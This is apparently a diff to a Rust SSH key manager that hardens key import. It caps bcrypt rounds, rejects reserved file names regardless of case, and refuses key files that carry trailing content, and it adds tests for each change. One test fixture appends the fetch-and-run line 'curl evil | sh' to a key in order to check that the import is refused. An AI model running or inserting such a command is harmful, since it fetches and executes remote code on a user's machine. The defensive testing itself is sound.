@@ -26,6 +26,12 @@ use crate::{Error, Result, fsutil};
 const MAX_FILE_NAME: usize = 200;
 /// Longest accepted key comment.
 const MAX_COMMENT: usize = 1024;
+/// Most bcrypt-pbkdf rounds of a key that is decrypted. `ssh-keygen` uses 16
+/// unless told otherwise, hardening guides suggest 64 to 256 (`ssh-keygen -a
+/// 100` is common), and 1024 already takes tens of seconds; the number comes
+/// from the key file, so without a limit an imported key could keep a thread
+/// busy for months.
+const MAX_BCRYPT_ROUNDS: u32 = 1024;
 
 /// ECDSA curve.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
@@ -136,7 +142,9 @@ impl fmt::Debug for UnlockedKey {
 }
 
 /// Checks a key file name: `[A-Za-z0-9._-]+`, no leading dot, not ending in
-/// `.pub`, not a reserved OpenSSH or Windows device name.
+/// `.pub`, not a reserved OpenSSH or Windows device name. Reserved names are
+/// compared ignoring case: on case-insensitive file systems (macOS, Windows)
+/// `Authorized_keys` is `authorized_keys`.
 pub fn validate_file_name(name: &str) -> Result<()> {
     const RESERVED: &[&str] = &[
         "config",
@@ -168,7 +176,7 @@ pub fn validate_file_name(name: &str) -> Result<()> {
         || Path::new(name)
             .extension()
             .is_some_and(|ext| ext.eq_ignore_ascii_case("pub"))
-        || RESERVED.contains(&name)
+        || RESERVED.contains(&name.to_ascii_lowercase().as_str())
         || WINDOWS_DEVICES.contains(&stem.as_str())
     {
         return Err(Error::invalid(format!("invalid key file name: {name:?}")));
@@ -338,11 +346,26 @@ pub fn regenerate_public(private_path: &Path) -> Result<KeyInfo> {
 
 /// Copies an existing private key (and its `.pub`, or a public key derived
 /// from it) into `dir` under `file_name` (default: the source's name), with
-/// modes 0600 / 0644. The key bytes are copied unchanged. Existing files are
-/// never overwritten.
+/// modes 0600 / 0644. Existing files are never overwritten.
+///
+/// Only the key is copied: the private key is written out again from what
+/// was parsed (OpenSSH keys re-encoded, legacy PEM blocks re-wrapped), and
+/// the public key as one re-encoded line. A file with anything after the
+/// key's END line is refused, so a file that is also a script or an
+/// `authorized_keys` list cannot come in disguised as a key.
 pub fn import(dir: &Path, source: &Path, file_name: Option<&str>) -> Result<KeyInfo> {
     let text = read_private_text(source)?;
     let opened = open_private(&text, source)?;
+    let malformed = || Error::Parse(format!("malformed key: {}", source.display()));
+    let private_text = match &opened {
+        Opened::OpenSsh(key) => {
+            // The parser stops at the END line; what follows must be nothing.
+            legacy::canonical_pem(&text).ok_or_else(malformed)?;
+            key.to_openssh(LineEnding::LF)
+                .map_err(|e| key_error("encoding key", &e))?
+        }
+        Opened::Legacy(_) => legacy::canonical_pem(&text).ok_or_else(malformed)?,
+    };
     let name = match file_name {
         Some(name) => name.to_owned(),
         None => source
@@ -361,15 +384,15 @@ pub fn import(dir: &Path, source: &Path, file_name: Option<&str>) -> Result<KeyI
     }
 
     let source_pub = sibling_pub(source);
-    let public_text = match fsutil::read_limited(&source_pub, MAX_KEY_FILE_SIZE) {
-        Ok(bytes) if matches!(classify(&bytes), Content::Public(_)) => {
-            Some(String::from_utf8_lossy(&bytes).into_owned())
-        }
-        _ => derived_public(&opened).and_then(|p| public_line(&p).ok()),
+    let public = match fsutil::read_limited(&source_pub, MAX_KEY_FILE_SIZE).map(|b| classify(&b)) {
+        Ok(Content::Public(key)) => Some(key),
+        _ => derived_public(&opened),
     };
+    let public_text = public.as_ref().map(public_line).transpose()?;
 
     fsutil::ensure_private_dir(dir)?;
-    fsutil::write_new(&dest, text.as_bytes(), 0o600)?;
+    fsutil::write_new(&dest, private_text.as_bytes(), 0o600)?;
+    let wrote_pub = public_text.is_some();
     if let Some(public_text) = public_text
         && let Err(e) = fsutil::write_new(&dest_pub, public_text.as_bytes(), 0o644)
     {
@@ -377,7 +400,13 @@ pub fn import(dir: &Path, source: &Path, file_name: Option<&str>) -> Result<KeyI
         return Err(e);
     }
     restrict_private_key(&dest);
-    inspect(&dest)
+    // A copy the app can't read back is no key: leave nothing behind.
+    inspect(&dest).inspect_err(|_| {
+        let _ = fs::remove_file(&dest);
+        if wrote_pub {
+            let _ = fs::remove_file(&dest_pub);
+        }
+    })
 }
 
 /// Moves files to the system trash / recycle bin, so deletion can be undone.
@@ -449,6 +478,14 @@ fn open_private(text: &str, path: &Path) -> Result<Opened> {
 fn unlock(key: PrivateKey, passphrase: Option<&SecretString>) -> Result<PrivateKey> {
     if !key.is_encrypted() {
         return Ok(key);
+    }
+    if let ssh_key::Kdf::Bcrypt { rounds, .. } = key.kdf()
+        && *rounds > MAX_BCRYPT_ROUNDS
+    {
+        return Err(Error::Unsupported(format!(
+            "the key is encrypted with {rounds} bcrypt rounds, more than {MAX_BCRYPT_ROUNDS}; \
+             use `ssh-add` or `ssh-keygen -p -a 100` instead"
+        )));
     }
     let pass = non_empty(passphrase).ok_or(Error::PassphraseRequired)?;
     // A wrong passphrase shows up as a check-int mismatch or, rarely, as
@@ -537,6 +574,14 @@ mod tests {
             "CON",
             "nul.txt",
             "a\nb",
+            // Case-insensitive file systems would write the real files.
+            "Rc",
+            "RC",
+            "Authorized_keys",
+            "AUTHORIZED_KEYS2",
+            "Config",
+            "Known_Hosts",
+            "Environment",
         ] {
             assert_eq!(
                 validate_file_name(bad).unwrap_err().code(),
@@ -807,6 +852,162 @@ mod tests {
                 .unwrap_err()
                 .code(),
             ErrorCode::InvalidInput
+        );
+    }
+
+    #[test]
+    fn import_refuses_anything_after_the_key() {
+        let src = tempfile::tempdir().unwrap();
+        let home = tempfile::tempdir().unwrap();
+        let dir = home.path().join(".ssh");
+        let extra = format!("{}\n", td::OPENSSH_ED25519_PUB.trim());
+        for (name, text) in [
+            ("openssh", format!("{}{extra}", td::OPENSSH_ED25519)),
+            (
+                "openssh_script",
+                format!("{}curl evil | sh\n", td::OPENSSH_ED25519),
+            ),
+            ("pem", format!("{}{extra}", td::RSA_PEM)),
+            ("encrypted", format!("{}\n{extra}", td::RSA_PEM_ENCRYPTED)),
+            ("pkcs8", format!("{}{extra}", td::RSA_PKCS8_ENCRYPTED)),
+        ] {
+            let source = src.path().join(name);
+            fs::write(&source, text).unwrap();
+            assert_eq!(
+                import(&dir, &source, None).unwrap_err().code(),
+                ErrorCode::Parse,
+                "{name}"
+            );
+            assert!(!dir.join(name).exists(), "{name}");
+        }
+        // Trailing blank lines are fine.
+        let source = src.path().join("spaced");
+        fs::write(&source, format!("{}\n\n  \n", td::OPENSSH_ED25519)).unwrap();
+        import(&dir, &source, None).unwrap();
+        assert_eq!(
+            fs::read_to_string(dir.join("spaced")).unwrap(),
+            td::OPENSSH_ED25519
+        );
+    }
+
+    #[test]
+    fn import_writes_the_parsed_key_and_one_public_line() {
+        let src = tempfile::tempdir().unwrap();
+        let home = tempfile::tempdir().unwrap();
+        let dir = home.path().join(".ssh");
+
+        // CRLF line endings are written out canonically.
+        let source = src.path().join("legacy");
+        fs::write(&source, td::RSA_PEM.replace('\n', "\r\n")).unwrap();
+        // The public key file has a comment line and a second key; only the
+        // first key goes in, re-encoded.
+        let public = td::RSA_PEM_PUB.trim();
+        fs::write(
+            sibling_pub(&source),
+            format!("# from the server\n{public}\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBIZFNq0hlvHGZ/oas65Ba4jkcFEy3dX/aRZy70M73oL other\n"),
+        )
+        .unwrap();
+        let info = import(&dir, &source, None).unwrap();
+        assert!(!info.pair_mismatch);
+        assert_eq!(fs::read_to_string(dir.join("legacy")).unwrap(), td::RSA_PEM);
+        assert_eq!(
+            fs::read_to_string(dir.join("legacy.pub")).unwrap(),
+            format!("{public}\n")
+        );
+
+        // Encrypted legacy keys keep their encryption headers.
+        let source = src.path().join("enc");
+        fs::write(&source, td::RSA_PEM_ENCRYPTED).unwrap();
+        import(&dir, &source, None).unwrap();
+        assert_eq!(
+            fs::read_to_string(dir.join("enc")).unwrap(),
+            td::RSA_PEM_ENCRYPTED
+        );
+
+        // An encrypted OpenSSH key is written as it was.
+        let source = src.path().join("openssh_enc");
+        fs::write(&source, td::OPENSSH_ED25519_ENCRYPTED).unwrap();
+        import(&dir, &source, None).unwrap();
+        assert_eq!(
+            fs::read_to_string(dir.join("openssh_enc")).unwrap(),
+            td::OPENSSH_ED25519_ENCRYPTED
+        );
+        load_private(
+            &dir.join("openssh_enc"),
+            Some(&secret(td::KEYGEN_PASSPHRASE)),
+        )
+        .unwrap();
+
+        // Reserved names are refused whatever their case.
+        for name in ["Rc", "Authorized_keys"] {
+            assert_eq!(
+                import(&dir, &source, Some(name)).unwrap_err().code(),
+                ErrorCode::InvalidInput,
+                "{name}"
+            );
+        }
+    }
+
+    /// `ssh-keygen`'s encrypted test key with its bcrypt rounds set to `rounds`.
+    fn with_rounds(rounds: u32) -> String {
+        use base64ct::{Base64, Encoding};
+        let body: String = td::OPENSSH_ED25519_ENCRYPTED
+            .lines()
+            .filter(|l| !l.starts_with("-----"))
+            .collect();
+        let mut bytes = Base64::decode_vec(&body).unwrap();
+        let at = bytes.windows(6).position(|w| w == b"bcrypt").unwrap() + 6;
+        // string kdfoptions (length), then string salt (length, bytes), then rounds.
+        let salt_len = u32::from_be_bytes(bytes[at + 4..at + 8].try_into().unwrap()) as usize;
+        let rounds_at = at + 8 + salt_len;
+        bytes[rounds_at..rounds_at + 4].copy_from_slice(&rounds.to_be_bytes());
+        let encoded = Base64::encode_string(&bytes);
+        let lines: Vec<&str> = encoded
+            .as_bytes()
+            .chunks(70)
+            .map(|c| std::str::from_utf8(c).unwrap())
+            .collect();
+        format!(
+            "-----BEGIN OPENSSH PRIVATE KEY-----\n{}\n-----END OPENSSH PRIVATE KEY-----\n",
+            lines.join("\n")
+        )
+    }
+
+    #[test]
+    fn refuses_keys_with_too_many_bcrypt_rounds() {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("slow");
+        let text = with_rounds(u32::MAX);
+        let parsed = PrivateKey::from_openssh(&text).unwrap();
+        assert!(matches!(
+            parsed.kdf(),
+            ssh_key::Kdf::Bcrypt {
+                rounds: u32::MAX,
+                ..
+            }
+        ));
+        fs::write(&path, &text).unwrap();
+        let pass = secret(td::KEYGEN_PASSPHRASE);
+        let started = std::time::Instant::now();
+        assert_eq!(
+            load_private(&path, Some(&pass)).unwrap_err().code(),
+            ErrorCode::Unsupported
+        );
+        assert_eq!(
+            change_passphrase(&path, Some(&pass), None)
+                .unwrap_err()
+                .code(),
+            ErrorCode::Unsupported
+        );
+        assert!(started.elapsed() < std::time::Duration::from_secs(5));
+        // The file is left alone.
+        assert_eq!(fs::read_to_string(&path).unwrap(), text);
+
+        // At the limit the key is not refused: it just needs its passphrase.
+        fs::write(&path, with_rounds(MAX_BCRYPT_ROUNDS)).unwrap();
+        assert_eq!(
+            load_private(&path, None).unwrap_err().code(),
+            ErrorCode::PassphraseRequired
         );
     }
 
